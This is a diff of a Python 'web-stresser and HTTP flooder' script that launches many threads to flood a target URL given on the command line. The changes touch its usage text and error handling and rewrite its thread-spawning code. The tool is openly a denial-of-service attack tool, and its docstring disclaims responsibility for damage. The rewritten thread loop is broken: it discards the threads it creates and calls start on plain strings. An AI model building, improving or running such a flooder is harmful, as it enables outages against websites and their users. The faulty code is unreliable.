@@ -1,5 +1,4 @@
 
-		
 """
 Alien stresser is a web-stresser  and HTTP flooder in python .
 /!\ Warning : the author isn't responsable for all damage
@@ -13,8 +12,8 @@ requests module installation in (Debian-based distribution):
 sudo apt-get install python-pip
 pip install requests
 Usage :
-python3 alien-stresser.py <HOST>
-python3 alien-stresser.py http://www.domain.com
+python alien-stresser.py <HOST>
+python alien-stresser.py http://www.domain.com
 """
 
 import sys
@@ -22,7 +21,8 @@ import threading
 try:
     import requests
 except ImportError:
-    print (" please install requests  module with pip n\ -sudo apt-get install python-pip n\ pip install requests n\ ")
+    print (" please install requests  module with pip \n -sudo apt-get install python-pip \n -pip install requests \n ")
+    sys.exit()
     
 
 
@@ -44,31 +44,13 @@ def stresser():
     
 
 def _threads_():
-	 c = threading.Thread(target=stresser)
-	 d = threading.Thread(target=stresser)
-	 a = threading.Thread(target=stresser)
-	 e = threading.Thread(target=stresser)
-	 z = threading.Thread(target=stresser)
-	 x = threading.Thread(target=stresser)
-	 c1 = threading.Thread(target=stresser)
-	 d1 = threading.Thread(target=stresser)
-	 a1 = threading.Thread(target=stresser)
-	 e1 = threading.Thread(target=stresser)
-	 z1 = threading.Thread(target=stresser)
-	 x1 = threading.Thread(target=stresser)
+	 liste = ['c','d','a','e','z','x','c1','d1','a1','e1','z1','x1']
+	 for _thread in liste  :
+		 _thread = threading.Thread(target=stresser)
+	 for _start in liste :
+		 _start.start()
 	 
-	 c.start()
-	 d.start()
-	 a.start()
-	 e.start()
-	 z.start()
-	 x.start()
-	 c1.start()
-	 d1.start()
-	 a1.start()
-	 e1.start()
-	 z1.start()
-	 x1.start()
+	 
 	
 def main():
     if len(sys.argv) != 2 :
